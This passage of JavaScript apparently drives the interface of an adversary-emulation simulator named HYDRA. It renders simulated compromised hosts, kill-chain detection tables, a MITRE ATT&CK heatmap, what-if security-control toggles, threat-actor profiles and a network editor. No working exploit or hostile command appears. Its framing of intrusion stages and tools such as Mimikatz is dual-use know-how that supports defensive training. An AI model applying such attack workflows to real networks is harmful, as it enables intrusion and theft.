        gauge.style.borderColor = tColor;
        gauge.querySelector('.hy-threat-val').style.color = tColor;
        gauge.querySelector('.hy-threat-val').textContent = engine.threatScore;
      }
    }

    function stat(label, val, color) {
      return '<div class="hy-stat">' +
        '<div class="hy-stat-val" style="color:' + color + '">' + esc(val) + '</div>' +
        '<div class="hy-stat-label">' + esc(label) + '</div></div>';
    }

    engine.onLog = appendLog;
    engine.onComm = appendComm;
    engine.onComplete = saveCampaign;
    engine.onUpdate = function() {
      updateStats();
      if (canvasRenderer && canvasRenderer.selectedNode) {
        var h = canvasRenderer.selectedNode;
        nodeInfo.style.display = 'block';
        var statusColor = STATUS_COLORS[h.status] || '#555';
        nodeInfo.innerHTML =
          '<div style="font-weight:700;color:var(--acc);margin-bottom:6px;letter-spacing:.04em;text-transform:uppercase;font-size:.68rem">' + esc(h.name) + '</div>' +
          '<div style="color:var(--mut);margin-bottom:2px">' + esc(h.ip) + ' / ' + esc(h.os) + '</div>' +
          '<div style="color:var(--mut);margin-bottom:6px">' + esc(h.role) + ' [' + esc(h.segment) + ']</div>' +
          '<div style="display:inline-block;padding:2px 8px;border-radius:2px;font-size:.62rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;background:' + statusColor + '22;color:' + statusColor + ';border:1px solid ' + statusColor + '44;margin-bottom:6px">' + h.status.toUpperCase() + '</div>' +
          (h.sessions.length > 0 ? '<div style="color:#ff1744;margin-top:4px;font-size:.68rem">SESSIONS: ' + h.sessions.length + '</div><div style="color:var(--mut);font-size:.62rem">' + h.sessions.map(function(s) { return s.user + ' via ' + s.via; }).join('<br>') + '</div>' : '') +
          (h.persistence.length > 0 ? '<div style="color:#00e676;margin-top:4px;font-size:.68rem">IMPLANTS: ' + h.persistence.map(function(p) { return p.name; }).join(', ') + '</div>' : '') +
          (h.controls.length > 0 ? '<div style="color:var(--acc);margin-top:4px;font-size:.68rem">CONTROLS: ' + h.controls.join(', ').toUpperCase() + '</div>' : '') +
          (h.exfilData.length > 0 ? '<div style="color:#d500f9;margin-top:4px;font-size:.68rem">DATA EXTRACTED: ' + h.exfilData.map(function(d) { return d.type; }).join(', ') + '</div>' : '');
      }
    };

    loadBtn.onclick = function() {
      engine.loadTemplate(envSel.value);
      logDiv.innerHTML = '';
      commsDiv.innerHTML = '';
      engine.addLog('RECON', '[INIT] Environment loaded: ' + ENV_TEMPLATES[envSel.value].name, ENV_TEMPLATES[envSel.value].desc + '\nHosts: ' + engine.hosts.length + '\nConnections: ' + engine.connections.length, '');
      updateStats();
      playBtn.disabled = false;
      stepBtn.disabled = false;
      // Init canvas
      if (canvasRenderer) canvasRenderer.stop();
      canvasRenderer = new HydraCanvas(canvasEl, engine);
      canvasRenderer.start();
      // Center canvas
      canvasRenderer.offsetX = 50;
      canvasRenderer.offsetY = 20;
    };

    playBtn.onclick = () => {
      engine.start(parseInt(speedSel.value));
      playBtn.disabled = true;
      pauseBtn.disabled = false;
    };
    pauseBtn.onclick = () => {
      if (engine.paused) { engine.resume(); pauseBtn.textContent = 'Pause'; }
      else { engine.pause(); pauseBtn.textContent = 'Resume'; }
    };
    stepBtn.onclick = () => { engine.step(); };
    resetBtn.onclick = () => {
      engine.stop();
      engine.loadTemplate(envSel.value || 'corporate');
      logDiv.innerHTML = '';
      updateStats();
      playBtn.disabled = false;
      pauseBtn.disabled = true;
    };
    speedSel.onchange = () => {
      if (engine.running) { engine.stop(); engine.start(parseInt(speedSel.value)); }
    };

    // Auto-load corporate on first render
    loadBtn.click();
  }

  function renderDefenseTab(container) {
    const analysis = engine.getDefenseAnalysis();
    if (analysis.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Run an operation first, then view the defense analysis.</p>';
      return;
    }

    let html = '<h2 class="pg-h2">Kill Chain Coverage Analysis</h2>' +
      '<p class="muted" style="margin-bottom:16px">For each attack phase, what could have detected or prevented it.</p>' +
      '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.78rem">' +
      '<thead><tr style="border-bottom:2px solid var(--line)">' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Phase</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Action</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Host</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">MITRE</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Detection Source</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Splunk Query</th>' +
      '</tr></thead><tbody>';

    analysis.forEach(f => {
      const det = f.detection;
      html += '<tr style="border-bottom:1px solid var(--line)">' +
        '<td style="padding:8px;color:' + (AGENT_COLORS[f.phase] || '#888') + ';font-weight:600">' + esc(f.phase) + '</td>' +
        '<td style="padding:8px">' + esc(f.action) + '</td>' +
        '<td style="padding:8px">' + esc(f.host) + '</td>' +
        '<td style="padding:8px;color:var(--acc)">' + esc(f.mitre) + '</td>' +
        '<td style="padding:8px;color:var(--mut)">' + esc(det.source) + '</td>' +
        '<td style="padding:8px"><code style="font-size:.7rem;color:var(--acc);word-break:break-all">' + esc(det.splunk) + '</code></td>' +
        '</tr>';
    });
    html += '</tbody></table></div>';

    // Gap analysis
    html += '<h2 class="pg-h2" style="margin-top:24px">Security Gaps Identified</h2>';
    const hostsNoEDR = engine.hosts.filter(h => h.sessions.length > 0 && !h.controls.includes('edr'));
    const hostsNoSIEM = engine.hosts.filter(h => h.sessions.length > 0 && !h.controls.includes('siem_agent'));
    html += '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px">';
    if (hostsNoEDR.length > 0) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;border-left:3px solid #ff1744">' +
        '<div style="font-weight:600;color:#ff1744">No EDR Coverage</div>' +
        '<div style="color:var(--mut);font-size:.78rem;margin-top:4px">' + hostsNoEDR.map(h => h.name).join(', ') + '</div>' +
        '<div style="font-size:.75rem;margin-top:8px">Impact: Cannot detect in-memory attacks, credential theft, lateral movement tools</div></div>';
    }
    if (hostsNoSIEM.length > 0) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;border-left:3px solid #ff9100">' +
        '<div style="font-weight:600;color:#ff9100">No SIEM Agent</div>' +
        '<div style="color:var(--mut);font-size:.78rem;margin-top:4px">' + hostsNoSIEM.map(h => h.name).join(', ') + '</div>' +
        '<div style="font-size:.75rem;margin-top:8px">Impact: Logs not centrally collected, attacks go unnoticed</div></div>';
    }
    const defaultCreds = engine.hosts.filter(h => h.creds && h.creds.some(c => c.pass));
    if (defaultCreds.length > 0) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;border-left:3px solid #ffd600">' +
        '<div style="font-weight:600;color:#ffd600">Weak/Default Credentials</div>' +
        '<div style="color:var(--mut);font-size:.78rem;margin-top:4px">' + defaultCreds.map(h => h.name).join(', ') + '</div>' +
        '<div style="font-size:.75rem;margin-top:8px">Impact: Trivial initial access and lateral movement</div></div>';
    }
    html += '</div>';

    container.innerHTML = html;
  }

  function renderReportTab(container) {
    if (engine.log.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Run an operation first to generate a report.</p>';
      return;
    }
    const report = engine.generateReport();
    container.innerHTML =
      '<div style="display:flex;align-items:center;gap:8px;margin-bottom:12px">' +
        '<h2 class="pg-h2" style="margin:0">Engagement Report</h2>' +
        '<span style="flex:1"></span>' +
        '<button class="btn sm" id="hy-copy-report">Copy to Clipboard</button>' +
      '</div>' +
      '<pre style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:16px;font-size:.78rem;white-space:pre-wrap;max-height:600px;overflow-y:auto;color:var(--txt);line-height:1.6">' + esc(report) + '</pre>';
    container.querySelector('#hy-copy-report').onclick = () => {
      navigator.clipboard.writeText(report).then(() => {
        container.querySelector('#hy-copy-report').textContent = 'Copied!';
        setTimeout(() => { container.querySelector('#hy-copy-report').textContent = 'Copy to Clipboard'; }, 1500);
      });
    };
  }

  function renderMitreTab(container) {
    const tactics = ['Reconnaissance', 'Resource Dev', 'Initial Access', 'Execution', 'Persistence', 'Priv Esc', 'Defense Evasion', 'Cred Access', 'Discovery', 'Lateral Mov', 'Collection', 'C2', 'Exfiltration', 'Impact'];
    const usedTechniques = new Set(engine.log.filter(e => e.mitre).map(e => e.mitre));
    const tacticTechniques = {
      'Reconnaissance': ['T1595', 'T1046'],
      'Initial Access': ['T1190', 'T1133', 'T1078'],
      'Execution': ['T1059', 'T1047'],
      'Persistence': ['T1547.001', 'T1053.005', 'T1543.003', 'T1546.003', 'T1574.001', 'T1505.003', 'T1098.004', 'T1546.015', 'T1556.001'],
      'Priv Esc': ['T1068', 'T1548'],
      'Defense Evasion': ['T1070', 'T1027'],
      'Cred Access': ['T1003', 'T1558.001', 'T1552', 'T1110'],
      'Discovery': ['T1046', 'T1087', 'T1082'],
      'Lateral Mov': ['T1550.002', 'T1550.003', 'T1569.002', 'T1047', 'T1021.006', 'T1021.004', 'T1563.002', 'T1021.003', 'T1572'],
      'Exfiltration': ['T1048.002', 'T1048.003', 'T1567.002', 'T1095'],
    };

    let html = '<h2 class="pg-h2">MITRE ATT&amp;CK Coverage Heatmap</h2>' +
      '<p class="muted" style="margin-bottom:16px">Techniques used in this engagement highlighted in red. Click to see detection guidance.</p>' +
      '<div style="display:flex;gap:4px;overflow-x:auto;padding-bottom:12px">';

    tactics.forEach(tactic => {
      const techs = tacticTechniques[tactic] || [];
      html += '<div style="min-width:90px;flex-shrink:0">' +
        '<div style="font-size:.65rem;font-weight:700;color:var(--acc);text-align:center;padding:6px;background:var(--card);border:1px solid var(--line);border-radius:4px 4px 0 0">' + esc(tactic) + '</div>';
      if (techs.length > 0) {
        techs.forEach(t => {
          const used = usedTechniques.has(t);
          html += '<div style="font-size:.6rem;padding:4px;text-align:center;border:1px solid var(--line);border-top:0;background:' + (used ? 'rgba(255,23,68,0.3)' : 'var(--card)') + ';color:' + (used ? '#ff1744' : 'var(--mut)') + '">' + esc(t) + '</div>';
        });
      } else {
        html += '<div style="font-size:.6rem;padding:4px;text-align:center;border:1px solid var(--line);border-top:0;color:var(--mut)">--</div>';
      }
      html += '</div>';
    });
    html += '</div>';

    // Stats
    const totalTechs = Object.values(tacticTechniques).flat().length;
    html += '<div style="margin-top:16px;display:flex;gap:16px">' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
        '<div style="font-size:1.4rem;font-weight:700;color:#ff1744">' + usedTechniques.size + '</div>' +
        '<div style="font-size:.75rem;color:var(--mut)">Techniques used</div></div>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
        '<div style="font-size:1.4rem;font-weight:700;color:var(--acc)">' + totalTechs + '</div>' +
        '<div style="font-size:.75rem;color:var(--mut)">Total in matrix</div></div>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
        '<div style="font-size:1.4rem;font-weight:700;color:#ff9100">' + (usedTechniques.size / Math.max(totalTechs, 1) * 100).toFixed(0) + '%</div>' +
        '<div style="font-size:.75rem;color:var(--mut)">Coverage</div></div>' +
      '</div>';

    container.innerHTML = html;
  }

  function renderWhatIfTab(container) {
    if (engine.hosts.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Load and run an operation first, then explore what-if scenarios.</p>';
      return;
    }
    var allControls = ['edr', 'av', 'siem_agent', 'waf', 'ips', 'dlp', 'mfa', 'proxy', 'ids'];
    var originalResults = {
      compromised: engine.hosts.filter(function(h) { return h.sessions.length > 0; }).length,
      total: engine.hosts.length,
      creds: engine.intel.credentials.length,
      exfil: engine.hosts.filter(function(h) { return h.exfilData.length > 0; }).length,
      vulns: engine.intel.vulns.length
    };

    var html = '<h2 class="pg-h2">What-If Security Analysis</h2>' +
      '<p class="muted" style="margin-bottom:16px">Toggle security controls on each host to see how the attack outcome would change. Modify controls and re-run the operation.</p>';

    html += '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.78rem">' +
      '<thead><tr style="border-bottom:2px solid var(--line)">' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Host</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Role</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Status</th>';
    allControls.forEach(function(c) {
      html += '<th style="padding:6px;text-align:center;color:var(--mut);font-size:.7rem">' + esc(c.toUpperCase()) + '</th>';
    });
    html += '</tr></thead><tbody>';

    engine.hosts.forEach(function(h) {
      var statusColor = h.sessions.length > 0 ? '#ff1744' : (h.status === 'scanned' ? '#00b0ff' : 'var(--mut)');
      html += '<tr style="border-bottom:1px solid var(--line)">' +
        '<td style="padding:8px;font-weight:600">' + esc(h.name) + '</td>' +
        '<td style="padding:8px;color:var(--mut)">' + esc(h.role) + '</td>' +
        '<td style="padding:8px;color:' + statusColor + '">' + h.status.toUpperCase() + '</td>';
      allControls.forEach(function(c) {
        var checked = h.controls.indexOf(c) >= 0 ? ' checked' : '';
        html += '<td style="padding:6px;text-align:center"><input type="checkbox" data-host="' + esc(h.id) + '" data-ctrl="' + esc(c) + '"' + checked + '></td>';
      });
      html += '</tr>';
    });
    html += '</tbody></table></div>';

    html += '<div style="margin-top:16px;display:flex;gap:12px;align-items:center;flex-wrap:wrap">' +
      '<button class="btn sm" id="wi-rerun">Re-run Operation with Changes</button>' +
      '<button class="btn sm ghost" id="wi-addall-edr">Add EDR Everywhere</button>' +
      '<button class="btn sm ghost" id="wi-addall-siem">Add SIEM Everywhere</button>' +
      '<button class="btn sm ghost" id="wi-reset-ctrl">Reset to Original</button>' +
      '</div>';

    html += '<div id="wi-results" style="margin-top:20px"></div>';

    html += '<h3 style="margin-top:24px;font-size:1rem;color:var(--txt)">Recommendations</h3>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px;margin-top:8px" id="wi-recs">';
    var recs = [];
    engine.hosts.forEach(function(h) {
      if (h.sessions.length > 0 && h.controls.indexOf('edr') < 0) {
        recs.push({ host: h.name, control: 'EDR', impact: 'Would have detected credential harvesting (Mimikatz, hashdump) and blocked in-memory attacks', severity: '#ff1744' });
      }
      if (h.sessions.length > 0 && h.controls.indexOf('siem_agent') < 0) {
        recs.push({ host: h.name, control: 'SIEM Agent', impact: 'Would have forwarded logs for correlation - lateral movement and persistence would trigger alerts', severity: '#ff9100' });
      }
      if (h.creds && h.creds.some(function(c) { return c.pass; }) && h.controls.indexOf('mfa') < 0) {
        recs.push({ host: h.name, control: 'MFA', impact: 'Stolen credentials alone would not suffice for authentication - blocks password-based attacks', severity: '#ffd600' });
      }
    });
    if (recs.length === 0) recs.push({ host: 'All', control: 'None needed', impact: 'Security controls appear comprehensive', severity: '#00e676' });
    recs.forEach(function(r) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px;border-left:3px solid ' + r.severity + '">' +
        '<div style="font-weight:600;color:' + r.severity + '">Add ' + esc(r.control) + ' to ' + esc(r.host) + '</div>' +
        '<div style="font-size:.78rem;color:var(--mut);margin-top:4px">' + esc(r.impact) + '</div></div>';
    });
    html += '</div>';

    container.innerHTML = html;

    container.querySelector('#wi-rerun').onclick = function() {
      var curEnv = null;
      for (var key in ENV_TEMPLATES) {
        if (ENV_TEMPLATES[key].hosts.length === engine.hosts.length) { curEnv = key; break; }
      }
      if (!curEnv) curEnv = 'corporate';
      var savedControls = {};
      engine.hosts.forEach(function(h) { savedControls[h.id] = h.controls.slice(); });
      engine.stop();
      engine.loadTemplate(curEnv);
      engine.hosts.forEach(function(h) {
        if (savedControls[h.id]) h.controls = savedControls[h.id];
      });
      engine.start(10);
      var checkDone = setInterval(function() {
        if (!engine.running) {
          clearInterval(checkDone);
          var newResults = {
            compromised: engine.hosts.filter(function(h) { return h.sessions.length > 0; }).length,
            total: engine.hosts.length,
            creds: engine.intel.credentials.length,
            exfil: engine.hosts.filter(function(h) { return h.exfilData.length > 0; }).length
          };
          var resultsDiv = container.querySelector('#wi-results');
          if (resultsDiv) {
            var diff = originalResults.compromised - newResults.compromised;
            resultsDiv.innerHTML =
              '<h3 style="font-size:1rem;color:var(--txt)">Comparison: Original vs. Modified</h3>' +
              '<div style="display:flex;gap:16px;flex-wrap:wrap;margin-top:8px">' +
                '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
                  '<div style="font-size:.7rem;color:var(--mut);margin-bottom:4px">ORIGINAL RUN</div>' +
                  '<div style="color:#ff1744;font-weight:700;font-size:1.2rem">' + originalResults.compromised + '/' + originalResults.total + ' compromised</div>' +
                  '<div style="font-size:.75rem;color:var(--mut)">' + originalResults.creds + ' creds, ' + originalResults.exfil + ' exfil points</div></div>' +
                '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
                  '<div style="font-size:.7rem;color:var(--mut);margin-bottom:4px">MODIFIED RUN</div>' +
                  '<div style="color:' + (diff > 0 ? '#00e676' : '#ff1744') + ';font-weight:700;font-size:1.2rem">' + newResults.compromised + '/' + newResults.total + ' compromised</div>' +
                  '<div style="font-size:.75rem;color:var(--mut)">' + newResults.creds + ' creds, ' + newResults.exfil + ' exfil points</div></div>' +
                (diff > 0 ? '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px;border-left:3px solid #00e676">' +
                  '<div style="font-size:.7rem;color:var(--mut);margin-bottom:4px">IMPROVEMENT</div>' +
                  '<div style="color:#00e676;font-weight:700;font-size:1.2rem">' + diff + ' fewer hosts compromised</div>' +
                  '<div style="font-size:.75rem;color:var(--mut)">Security controls made a measurable difference</div></div>' : '') +
              '</div>';
          }
        }
      }, 500);
    };

    container.addEventListener('change', function(e) {
      var cb = e.target;
      if (!cb.dataset || !cb.dataset.host) return;
      var host = engine.hosts.find(function(h) { return h.id === cb.dataset.host; });
      if (!host) return;
      var ctrl = cb.dataset.ctrl;
      if (cb.checked && host.controls.indexOf(ctrl) < 0) host.controls.push(ctrl);
      else if (!cb.checked) host.controls = host.controls.filter(function(c) { return c !== ctrl; });
    });

    container.querySelector('#wi-addall-edr').onclick = function() {
      engine.hosts.forEach(function(h) { if (h.controls.indexOf('edr') < 0) h.controls.push('edr'); });
      renderWhatIfTab(container);
    };
    container.querySelector('#wi-addall-siem').onclick = function() {
      engine.hosts.forEach(function(h) { if (h.controls.indexOf('siem_agent') < 0) h.controls.push('siem_agent'); });
      renderWhatIfTab(container);
    };
    container.querySelector('#wi-reset-ctrl').onclick = function() {
      var curEnv = null;
      for (var key in ENV_TEMPLATES) {
        if (ENV_TEMPLATES[key].hosts.length === engine.hosts.length) { curEnv = key; break; }
      }
      if (curEnv) {
        var orig = ENV_TEMPLATES[curEnv].hosts;
        engine.hosts.forEach(function(h) {
          var o = orig.find(function(x) { return x.id === h.id; });
          if (o) h.controls = o.controls.slice();
        });
      }
      renderWhatIfTab(container);
    };
  }

  // ========================================================================
  // ADVERSARY EMULATION TAB
  // ========================================================================
  function renderAdversaryTab(container) {
    var html = '<h2 class="pg-h2" style="color:var(--acc);letter-spacing:.06em">Adversary Emulation</h2>' +
      '<p class="muted" style="margin-bottom:16px;font-size:.78rem">Select a threat actor profile. The engine adjusts speed, stealth, and technique selection to match their real-world playbook.</p>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:10px">';
    APT_PROFILES.forEach(function(apt, idx) {
      var stealthPct = (apt.stealth * 100).toFixed(0);
      var speedLabel = apt.speed === 'slow_and_careful' ? 'Patient' : apt.speed === 'aggressive' ? 'Aggressive' : apt.speed === 'fast' ? 'Fast' : 'Moderate';
      var speedColor = apt.speed === 'slow_and_careful' ? '#00e676' : apt.speed === 'aggressive' ? '#ff1744' : apt.speed === 'fast' ? '#ff9100' : '#ffd600';
      html += '<div class="hy-apt-card">' +
        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">' +
          '<div class="hy-apt-name">' + esc(apt.name) + '</div>' +
          '<span class="hy-apt-nation">' + esc(apt.nation) + '</span>' +
        '</div>' +
        '<div class="hy-apt-desc">' + esc(apt.description) + '</div>' +
        '<div style="display:flex;gap:16px;margin-bottom:8px;font-size:.7rem">' +
          '<div><span style="color:var(--mut)">Stealth </span><span style="color:var(--acc)">' + stealthPct + '%</span>' +
            '<div class="hy-stealth-bar" style="width:80px"><div class="hy-stealth-fill" style="width:' + stealthPct + '%;background:var(--acc)"></div></div>' +
          '</div>' +
          '<div><span style="color:var(--mut)">Speed </span><span style="color:' + speedColor + '">' + speedLabel + '</span></div>' +
        '</div>' +
        '<div style="font-size:.68rem;color:var(--mut);margin-bottom:6px">' + apt.targets.map(function(t) { return '<span style="display:inline-block;padding:1px 6px;border:1px solid var(--line);border-radius:2px;margin:1px;font-size:.62rem;text-transform:uppercase;letter-spacing:.03em">' + esc(t) + '</span>'; }).join(' ') + '</div>' +
        '<div style="font-size:.68rem;color:var(--mut);margin-bottom:8px">Tools: ' + esc(apt.tools.join(', ')) + '</div>' +
        '<div style="font-size:.68rem;color:var(--acc);background:rgba(0,229,255,0.04);border:1px solid rgba(0,229,255,0.12);border-radius:3px;padding:8px;margin-bottom:10px;line-height:1.5">' +
          '<strong style="letter-spacing:.03em">CAMPAIGN:</strong> ' + esc(apt.campaign) +
        '</div>' +
        '<button class="hy-btn" data-apt="' + idx + '">Emulate</button>' +
      '</div>';
    });
    html += '</div>';
    if (engine.activeAPT !== undefined) {
      var a = APT_PROFILES[engine.activeAPT];
      html += '<div style="margin-top:16px;padding:12px;background:rgba(255,23,68,0.08);border:1px solid rgba(255,23,68,0.3);border-radius:6px">' +
        '<span style="font-weight:600;color:#ff1744">Active emulation: ' + esc(a.name) + '</span> ' +
        '<span style="color:var(--mut);font-size:.78rem">— load an environment and press Play to run as this adversary</span>' +
        ' <button class="btn sm ghost" id="hy-clear-apt" style="margin-left:12px">Clear</button></div>';
    }
    container.innerHTML = html;
    container.onclick = function(e) {
      var btn = e.target.closest('[data-apt]');
      if (btn) {
        engine.activeAPT = parseInt(btn.dataset.apt);
        var apt = APT_PROFILES[engine.activeAPT];
        engine.stealthMod = apt.stealth;
        renderAdversaryTab(container);
        return;
      }
      if (e.target.id === 'hy-clear-apt') {
        engine.activeAPT = undefined;
        engine.stealthMod = undefined;
        renderAdversaryTab(container);
      }
    };
  }

  // ========================================================================
  // NETWORK EDITOR TAB
  // ========================================================================
  function renderEditorTab(container) {
    var saved = [];
    try { saved = JSON.parse(localStorage.getItem('hydra_custom_envs') || '[]'); } catch(_){}
    var html = '<h2 class="pg-h2">Network Editor</h2>' +
      '<p class="muted" style="margin-bottom:16px">Build your own network topology to test with HYDRA. Add hosts, define connections, save and load custom environments.</p>';
    // Saved environments
    if (saved.length > 0) {
      html += '<div style="margin-bottom:16px"><strong style="font-size:.85rem">Saved Environments</strong>' +
        '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:8px">';
      saved.forEach(function(s, i) {
        html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:8px 14px;display:flex;align-items:center;gap:10px">' +
          '<span style="font-size:.82rem;font-weight:600">' + esc(s.name) + '</span>' +
          '<span style="font-size:.7rem;color:var(--mut)">' + s.hosts.length + ' hosts</span>' +
          '<button class="btn sm" data-load="' + i + '">Load</button>' +
          '<button class="btn sm ghost" data-del="' + i + '" style="color:var(--bad,#f44)">Del</button>' +
        '</div>';
      });
      html += '</div></div>';
    }
    // Add host form
    html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:16px;margin-bottom:16px">' +
      '<strong style="font-size:.85rem">Add Host</strong>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;margin-top:10px">' +
        '<input id="ne-name" placeholder="Hostname" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:6px 10px;border-radius:4px;font-size:.8rem">' +
        '<input id="ne-ip" placeholder="IP Address" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:6px 10px;border-radius:4px;font-size:.8rem">' +
        '<input id="ne-os" placeholder="OS (e.g. Windows Server 2022)" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:6px 10px;border-radius:4px;font-size:.8rem">' +
        '<input id="ne-role" placeholder="Role (e.g. Web Server)" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:6px 10px;border-radius:4px;font-size:.8rem">' +
        '<input id="ne-segment" placeholder="Segment (e.g. dmz)" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:6px 10px;border-radius:4px;font-size:.8rem">' +
        '<input id="ne-services" placeholder="Services: http:80,ssh:22,mysql:3306" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:6px 10px;border-radius:4px;font-size:.8rem">' +
      '</div>' +
      '<div style="margin-top:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">' +
        '<span style="font-size:.75rem;color:var(--mut)">Controls:</span>' +
        ['edr','av','siem_agent','waf','ips','dlp','mfa','proxy','ids'].map(function(c) {
          return '<label style="font-size:.72rem;display:flex;align-items:center;gap:3px;cursor:pointer"><input type="checkbox" data-ctrl="' + c + '"> ' + c + '</label>';
        }).join('') +
        '<span style="font-size:.75rem;color:var(--mut);margin-left:8px">Value:</span>' +
        '<input id="ne-value" type="range" min="1" max="10" value="5" style="width:80px">' +
        '<span id="ne-valshow" style="font-size:.75rem;color:var(--acc)">5</span>' +
      '</div>' +
      '<button class="btn sm" id="ne-add" style="margin-top:10px">Add Host</button>' +
    '</div>';
    // Current hosts table
    if (engine.hosts.length > 0) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:16px;margin-bottom:16px">' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><strong style="font-size:.85rem">Current Hosts (' + engine.hosts.length + ')</strong><span style="flex:1"></span>' +
          '<input id="ne-envname" placeholder="Environment name" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:4px 8px;border-radius:4px;font-size:.78rem;width:180px">' +
          '<button class="btn sm" id="ne-save">Save Environment</button>' +
        '</div>' +
        '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.75rem">' +
        '<thead><tr style="border-bottom:2px solid var(--line)">' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Name</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">IP</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">OS</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Role</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Services</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Controls</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Value</th>' +
        '<th style="padding:6px;color:var(--mut)">Del</th>' +
        '</tr></thead><tbody>';
      engine.hosts.forEach(function(h) {
        html += '<tr style="border-bottom:1px solid var(--line)">' +
          '<td style="padding:6px;font-weight:600">' + esc(h.name) + '</td>' +
          '<td style="padding:6px;color:var(--mut)">' + esc(h.ip) + '</td>' +
          '<td style="padding:6px;color:var(--mut)">' + esc(h.os) + '</td>' +
          '<td style="padding:6px">' + esc(h.role) + '</td>' +
          '<td style="padding:6px;color:var(--acc);font-size:.7rem">' + (h.services || []).map(function(s) { return s.name + ':' + s.port; }).join(', ') + '</td>' +
          '<td style="padding:6px;font-size:.7rem">' + (h.controls || []).join(', ') + '</td>' +
          '<td style="padding:6px;text-align:center">' + h.value + '</td>' +
          '<td style="padding:6px;text-align:center"><button class="btn sm ghost" data-rmhost="' + esc(h.id) + '" style="color:var(--bad,#f44);padding:2px 6px">X</button></td>' +
        '</tr>';
      });
      html += '</tbody></table></div>';
      // Add connection
      html += '<div style="margin-top:12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">' +
        '<span style="font-size:.78rem;color:var(--mut)">Add connection:</span>' +
        '<select id="ne-from" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:4px 8px;border-radius:4px;font-size:.78rem">' +
          engine.hosts.map(function(h) { return '<option value="' + esc(h.id) + '">' + esc(h.name) + '</option>'; }).join('') +
        '</select>' +
        '<span style="color:var(--mut)">-></span>' +
        '<select id="ne-to" style="background:var(--card2,#111);border:1px solid var(--line);color:var(--txt);padding:4px 8px;border-radius:4px;font-size:.78rem">' +
          engine.hosts.map(function(h) { return '<option value="' + esc(h.id) + '">' + esc(h.name) + '</option>'; }).join('') +
        '</select>' +
        '<label style="font-size:.75rem;display:flex;align-items:center;gap:3px"><input type="checkbox" id="ne-bidir" checked> Bidirectional</label>' +
        '<button class="btn sm" id="ne-addconn">Add</button>' +
      '</div>';
      html += '</div>';
    }
    container.innerHTML = html;
    // Wire events
    var valSlider = container.querySelector('#ne-value');
    var valShow = container.querySelector('#ne-valshow');
    if (valSlider) valSlider.oninput = function() { valShow.textContent = valSlider.value; };
    var addBtn = container.querySelector('#ne-add');
    if (addBtn) addBtn.onclick = function() {
      var name = container.querySelector('#ne-name').value.trim();
      var ip = container.querySelector('#ne-ip').value.trim();
      if (!name || !ip) return;
      var os = container.querySelector('#ne-os').value.trim() || 'Unknown';
      var role = container.querySelector('#ne-role').value.trim() || 'Server';
      var segment = container.querySelector('#ne-segment').value.trim() || 'default';
      var svcStr = container.querySelector('#ne-services').value.trim();
      var services = svcStr ? svcStr.split(',').map(function(s) { var p = s.trim().split(':'); return { name: p[0], port: parseInt(p[1]) || 80, version: '*' }; }) : [];
      var controls = [];
      container.querySelectorAll('[data-ctrl]').forEach(function(cb) { if (cb.checked) controls.push(cb.dataset.ctrl); });
